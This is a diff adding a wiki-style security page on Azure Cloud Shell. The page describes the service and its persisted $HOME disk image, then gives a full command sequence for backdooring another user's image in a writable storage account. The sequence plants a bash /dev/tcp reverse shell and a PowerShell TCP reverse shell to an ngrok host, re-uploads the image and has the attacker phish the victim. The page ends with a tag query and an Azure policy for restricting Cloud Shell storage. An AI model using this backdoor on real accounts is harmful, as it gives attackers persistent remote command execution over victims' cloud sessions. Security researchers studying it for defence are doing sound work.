@@ -1,0 +1,119 @@
+# Az - Cloud Shell
+
+## Azure Cloud Shell
+
+**Azure Cloud Shell** is an interactive, authenticated, browser-accessible terminal designed for managing Azure resources, offering the flexibility to work with either Bash or PowerShell. It runs on a temporary, per-session host that times out after 20 minutes of inactivity, while persisting files in the $HOME location using a 5-GB file share. Cloud Shell can be accessed through multiple points, including the Azure portal, shell.azure.com, Azure CLI and PowerShell documentation, the Azure mobile app, and the Visual Studio Code Azure Account extension.
+
+There aren't permissions assigned to this service, therefore the aren't privilege escalation techniques. Also there isn't any kind of enumeration.
+
+### Key Features
+
+- **Preinstalled Tools**: Cloud Shell includes a comprehensive set of preinstalled tools such as Azure CLI, Azure PowerShell, Terraform, Docker CLI, Ansible, Git, and text editors like vim, nano, and emacs. These tools are ready to use. To list the installed packeges and modules you can use "Get-Module -ListAvailable", "tdnf list" and "pip3 list".
+- **Azure drive (Azure:)**: PowerShell in Azure Cloud Shell includes the Azure drive (Azure:), which allows easy navigation of Azure resources like Compute, Network, and Storage using filesystem-like commands. Switch to the Azure drive with cd Azure: and return to your home directory with cd ~. You can still use Azure PowerShell cmdlets to manage resources from any drive.
+- **Custom Tool Installation**: Users who configure Cloud Shell with a storage account can install additional tools that do not require root permissions. This feature allows for further customization of the Cloud Shell environment, enabling users to tailor their setup to their specific needs.
+- **$HOME persistence**: When starting Azure Cloud Shell for the first time, you can use it with or without an attached storage account.
+    - Choosing not to attach storage creates an ephemeral session where files are deleted when the session ends.
+    - To persist files across sessions, you are given the option to **mount a storage account**, which attaches automatically as `$HOME\clouddrive`, with your `$HOME` directory **saved as an .img file in a File Share.**
+
+### Cloud Shell Phishing
+
+If an attacker finds other users images in a Storage Accout he has write and read access to, he will be able to download the image, **add a bash and PS backdoor into it**, and upload it back to the Storage Account so next time the user access the shell, the **commands will be automatically executed**.
+
+- **Download, backdoor and uplaod the image:**
+
+```bash
+# Download image
+mkdir /tmp/phishing_img
+az storage file download-batch -d /tmp/phishing_img --account-name <acc-name> -s <file-share>
+
+# Mount the image
+mkdir /tmp/backdoor_img
+sudo mount ./.cloudconsole/acc_carlos.img /tmp/backdoor_img
+cd /tmp/backdoor_img
+
+# Create backdoor
+mkdir .config
+mkdir .config/PowerShell
+touch .config/PowerShell/Microsoft.PowerShell_profile.ps1
+chmod 777 .config/PowerShell/Microsoft.PowerShell_profile.ps1
+
+# Bash backdoor
+echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/${SERVER}/${PORT} 0>&1 &)' >> .bashrc
+
+# PS backdoor
+echo '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19838);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' >> .config/PowerShell/Microsoft.PowerShell_profile.ps1
+
+# Unmount
+cd /tmp
+sudo umount /tmp/backdoor_img
+
+# Upload image
+az storage file upload --account-name <acc-name> --path ".cloudconsole/acc_username.img" --source "./tmp/phishing_img/.cloudconsole/acc_username.img" -s <file-share>
+```
+
+- **Then, phish the user to access https://shell.azure.com/**
+
+### Find & Forbid Cloud Shell Automatic Storage Accounts
+
+Storage accounts created by Cloud Shell are tagged with **`ms-resource-usage:azure-cloud-shell`**. It’s possible to create an Azure resource policy that disable creating resources with this tag.
+
+Find all the storage accounts created by Cloud Shell by tags:
+
+```bash
+az storage account list --output json | jq '.[] | select(.tags["ms-resource-usage"]=="azure-cloud-shell")'
+```
+
+Policy to forbid the creation of automatic storage accounts for cloud shell storage based on tags:
+
+```json
+{
+    displayName: "Restrict cloud shell storage account creation",
+    description: "Storage accounts that you create in Cloud Shell are tagged with ms-resource-usage:azure-cloud-shell. If you want to disallow users from creating storage accounts in Cloud Shell, create an Azure resource policy for tags that is triggered by this specific tag. https://learn.microsoft.com/en-us/azure/cloud-shell/persisting-shell-storage#restrict-resource-creation-with-an-azure-resource-policy",
+    metadata: {
+        category: "Storage",
+        version: "1.0.0"
+    },
+    mode: "All",
+    parameters: {
+        effect: {
+            type: "String",
+            metadata: {
+                displayName: "Effect",
+                description: "Deny, Audit or Disabled the execution of the Policy"
+            },
+            allowedValues: [
+                "Deny",
+                "Audit",
+                "Disabled"
+            ],
+            defaultValue: "Audit"
+        }
+    },
+    policyRule: {
+        if: {
+            allOf: [
+                {
+                field: "type",
+                equals: "Microsoft.Storage/storageAccounts"
+                },
+                {
+                field: "tags['ms-resource-usage']",
+                equals: "azure-cloud-shell"
+                }
+            ]
+        },
+        then: {
+            effect: "[parameters('effect')]"
+        }
+    }
+}
+```
+
+## Persistence
+
+## References
+
+- [https://learn.microsoft.com/en-us/azure/cloud-shell/overview](https://learn.microsoft.com/en-us/azure/cloud-shell/overview)
+- [https://learn.microsoft.com/en-us/azure/cloud-shell/features](https://learn.microsoft.com/en-us/azure/cloud-shell/features)
+- [https://learn.microsoft.com/en-us/azure/cloud-shell/using-the-shell-window](https://learn.microsoft.com/en-us/azure/cloud-shell/using-the-shell-window)
+- [https://www.azadvertizer.net/azpolicyadvertizer/dab3c67a-5f00-47ec-bba6-cc6984c33ae0.html](https://www.azadvertizer.net/azpolicyadvertizer/dab3c67a-5f00-47ec-bba6-cc6984c33ae0.html)
